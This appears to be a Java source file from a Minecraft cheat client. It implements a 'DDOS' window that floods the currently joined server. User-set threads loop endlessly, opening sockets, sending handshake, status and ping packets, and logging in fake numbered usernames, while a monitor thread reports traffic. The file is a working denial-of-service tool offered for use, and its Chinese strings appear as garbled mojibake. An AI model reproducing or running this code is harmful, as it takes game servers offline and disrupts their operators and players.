package it.fktcod.ktykshrk.module.mods.addon;

import java.awt.Color;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.border.EmptyBorder;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;

import it.fktcod.ktykshrk.managers.CommandManager;
import it.fktcod.ktykshrk.module.mods.DDOS;
import it.fktcod.ktykshrk.utils.frame.FCommand;
import it.fktcod.ktykshrk.utils.visual.ChatUtils;
import it.fktcod.ktykshrk.wrappers.Wrapper;

public class DDOSWindow extends JFrame {
	public static long data = 0;
	public static String[] part1;
	public static int port;
	public static byte[] hand;
	public static byte[] login;
	public static byte[] ping;
	public static byte[] pack;
	public static int version = -1;
	public static long killT = 0;
	public static long point = 0;
	public static String text = "";

	private JPanel contentPane;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					DDOSWindow frame = new DDOSWindow();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	public DDOSWindow() {
		setTitle("DDOS");
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(null);

		JTextArea textArea = new JTextArea();
		textArea.setBackground(Color.WHITE);
		textArea.setToolTipText("�����ĸ����ַ�");
		textArea.setBounds(0, 39, 434, 24);
		contentPane.add(textArea);

		JTextArea wversion = new JTextArea();
		wversion.setBackground(Color.WHITE);
		wversion.setToolTipText("�汾��");
		wversion.setBounds(0, 39, 434, 24);
		contentPane.add(wversion);

		JButton btnNewButton = new JButton("Run");
		btnNewButton.setBounds(10, 74, 103, 25);
		contentPane.add(btnNewButton);

		btnNewButton.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				ByteArrayOutputStream b;
				DataOutputStream handshake;
				
				
				
				ChatUtils.message("��ʼ");
				String ip = Wrapper.INSTANCE.mc().getCurrentServerData().serverIP.toLowerCase();
				part1 = ip.split(":");
				port = Integer.parseInt(part1[1]);
				int num = DDOS.threadNum.getValue().intValue();
				ChatUtils.message("������");
				try {
					
					//

					
					ChatUtils.message("���е�һ������");

					b = new ByteArrayOutputStream();
					handshake = new DataOutputStream(b);
					handshake.write(0x00);
					// �汾��δ֪
					writeVarInt(handshake, -1);
					// ip��ַ����
					writeVarInt(handshake, part1[0].length());
					// ip
					handshake.writeBytes(part1[0]);
					// port
					handshake.writeShort(port);
					// state (1 for handshake)
					writeVarInt(handshake, 1);
					hand = b.toByteArray();

					b = new ByteArrayOutputStream();
					handshake = new DataOutputStream(b);
					handshake.write(0x01);
					handshake.writeLong(Long.MAX_VALUE);
					ping = b.toByteArray();

					b = new ByteArrayOutputStream();
					handshake = new DataOutputStream(b);
					handshake.write(0x00);
					pack = b.toByteArray();
					//

				} catch (Exception var5) {
					var5.printStackTrace();

				}

				ChatUtils.message("�汾�����");
				boolean lock = true;

				try {
					Socket s1 = new Socket(part1[0], port);
					// ��׼��
					InputStream is = s1.getInputStream();
					DataInputStream di = new DataInputStream(is);
					OutputStream os = s1.getOutputStream();
					DataOutputStream dos = new DataOutputStream(os);

					// ����
					// prepend size
					writeVarInt(dos, hand.length);
					// write handshake packet
					dos.write(hand);
					// ��С��
					// prepend size
					writeVarInt(dos, pack.length);
					// write handshake packet
					dos.write(pack);
					dos.flush();
					// ������С
					data = data + readVarInt(di);
					readVarInt(di);
					byte[] temp1 = new byte[readVarInt(di)];
					di.readFully(temp1);

					String motdT = new String(temp1);
					JsonParser json = new JsonParser();
					JsonElement part5 = json.parse(motdT);
					JsonElement part6 = part5.getAsJsonObject().get("version");
					ChatUtils.message("�������汾:" + part6.getAsJsonObject().get("name").getAsString() + ",Э��汾��:"
							+ part6.getAsJsonObject().get("protocol").getAsInt());
					version = part6.getAsJsonObject().get("protocol").getAsInt();

					di.close();
					is.close();
					dos.close();
					os.close();
					s1.close();
				} catch (Exception e1) {
					lock = false;
					e1.printStackTrace();
					ChatUtils.message("̽��ʧ�ܣ����ֶ�����Э��汾��:");
					version = Integer.parseInt(wversion.getText());
				}

				if (lock) {

					ChatUtils.message("��������ȷ��Э��汾��:");
					version = Integer.parseInt(wversion.getText());

				}
				
				try {
		            b = new ByteArrayOutputStream();
		            handshake = new DataOutputStream(b);
		            handshake.write(0x00);
		            writeVarInt(handshake, version);//�汾��δ֪
		            writeVarInt(handshake,part1[0].length()); //ip��ַ����
		            handshake.writeBytes(part1[0]); //ip
		            handshake.writeShort(port); //port
		            writeVarInt(handshake, 2); //state (1 for handshake)
		            login = b.toByteArray();
		        } catch (Exception e2) {
		            e2.printStackTrace();
		        }
		        ChatUtils.message("���������߳�PS:��ʱ����ʾ\"[MineCraftHackDOS]>0byte\"��Ϣ��Ϊ����ʧ��");
		        Runnable thread4 = new Thread4();
		        Thread thread3 = new Thread(thread4);
		        thread3.start();//���������߳�
		        for (int i = 1; i <= num; i++) {
		            Runnable thread1 = new Thread1();
		            Thread thread2 = new Thread(thread1);
		            thread2.start();//���������߳�
		        }

		    }
		
			
		});

	}

	public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
		while (true) {
			if ((paramInt & 0xFFFFFF80) == 0) {
				out.writeByte(paramInt);
				return;
			}
			out.writeByte(paramInt & 0x7F | 0x80);
			paramInt >>>= 7;
		}
	}

	public static int readVarInt(DataInputStream in) throws IOException {
		int i = 0;
		int j = 0;
		while (true) {
			int k = in.readByte();
			i |= (k & 0x7F) << j++ * 7;
			if (j > 5) {
				throw new RuntimeException("VarInt̫��");
			}
			if ((k & 0x80) != 128) {
				break;
			}
		}
		return i;
	}
	
	class Thread1 implements Runnable {
	    @Override
	    public void run() {
	        while (true) {
	            try {
	                Socket s = new Socket(part1[0], port);
	                //��׼��
	                InputStream is = s.getInputStream();
	                DataInputStream di = new DataInputStream(is);
	                OutputStream os = s.getOutputStream();
	                DataOutputStream dos = new DataOutputStream(os);
	                int temp;

	                //����
	                writeVarInt(dos, hand.length); //prepend size
	                dos.write(hand); //write handshake packet
	                //��С��
	                writeVarInt(dos, pack.length); //prepend size
	                dos.write(pack); //write handshake packet
	                dos.flush();

	                data = data + readVarInt(di);//������С
	               readVarInt(di);
	                byte[] temp1 = new byte[readVarInt(di)];
	                di.readFully(temp1);

	                try {
	                    //ping��
	                   writeVarInt(dos, ping.length); //prepend size
	                    dos.write(ping); //write handshake packet
	                    dos.flush();
	                    data = data + readVarInt(di);
	                   readVarInt(di);
	                    di.readLong();
	                    //di.readLong();
	                } catch (Exception e) {

	                }

	                di.close();
	                is.close();
	                dos.close();
	                os.close();
	                s.close();

	                s = new Socket(part1[0], port);
	                //��׼��
	                is = s.getInputStream();
	                di = new DataInputStream(is);
	                os = s.getOutputStream();
	                dos = new DataOutputStream(os);
	                //�ڶ�������
	                writeVarInt(dos, login.length); //prepend size
	                dos.write(login); //write handshake packet
	                ByteArrayOutputStream b;
	                DataOutputStream handshake;
	                b = new ByteArrayOutputStream();
	                handshake = new DataOutputStream(b);
	                handshake.write(0x00);
	                String temp5 = text + point;
	               point++;
	                writeVarInt(handshake, temp5.length());
	                handshake.writeBytes(temp5);
	                byte[] username = b.toByteArray();
	                writeVarInt(dos, username.length); //prepend size
	                dos.write(username); //write handshake packet
	                dos.flush();
	                s.setSoTimeout(1500);
	                while (true) {
	                    try {
	                        int length = readVarInt(di);
	                        data =data + length;
	                        byte[] lj = new byte[length];
	                        di.readFully(lj);
	                    } catch (Exception e) {
	                        break;
	                    }
	                }
	                //main.data=main.data+main.readVarInt(di);<--���Ӳ�Ҫ���������
	                di.close();
	                is.close();
	                dos.close();
	                os.close();
	                s.close();
	            } catch (Exception e) {
	                // TODO �Զ����ɵ� catch ��
	                //e.printStackTrace();
	               killT++;
	                //e.printStackTrace();
	            }
	        }
	    }
	}
	
	class Thread4 implements Runnable {
	    @Override
	    public void run() {
	        try {
	            while (true) {
	                Thread.sleep(3000);
	                if (data >= 1024 * 1024 * 1024) {
	                    double a =data / (1024.0 * 1024.0 * 1024.0);
	                    ChatUtils.warning("[MineCraftHackDOS]>" + a + "kb," + killT + "thread");
	                    continue;
	                }
	                if (data >= 1024 * 1024) {
	                    double a = data / (1024.0 * 1024.0);
	                    ChatUtils.warning("[MineCraftHackDOS]>" + a + "mb," + killT + "thread");
	                    continue;
	                }
	                if (data >= 1024) {
	                    double a = data / 1024.0;
	                    ChatUtils.warning("[MineCraftHackDOS]>" + a + "kb," + killT + "thread");
	                    continue;
	                }
	                if (data < 1024) {
	                    ChatUtils.warning("[MineCraftHackDOS]>" + data + "byte," + killT + "thread");
	                    continue;
	                }
	            }
	        } catch (InterruptedException e) {
	            // TODO �Զ����ɵ� catch ��
	            e.printStackTrace();
	        }

	    }
	}

}
